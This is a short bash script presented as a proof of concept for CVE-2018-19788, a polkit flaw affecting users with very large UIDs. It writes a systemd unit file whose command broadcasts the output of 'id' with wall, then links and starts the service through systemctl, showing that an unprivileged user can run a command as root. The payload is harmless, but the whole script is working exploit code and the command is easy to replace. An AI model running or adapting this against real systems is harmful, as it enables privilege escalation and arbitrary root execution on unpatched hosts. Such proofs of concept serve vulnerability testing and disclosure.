#!/bin/bash
set -e

command_exists() {
    command -v "$@" > /dev/null 2>&1
}

# PoC for CVE-2018-19788
prepare() {

	cat >woot.service<<EOF
	[Unit]
	Description=Woot
	[Service]
	Type=notify
	ExecStart=/bin/bash -c "echo woot \$(id)|wall"
	KillMode=process
	Restart=on-failure
	RestartSec=42s
	[Install]
	WantedBy=multi-user.target
EOF
}

exploit() {

    prepare

    if command_exists systemctl; then
    (
        set -x
        systemctl link $PWD/woot.service
        systemctl start woot
    ) || true
    fi
}

exploit
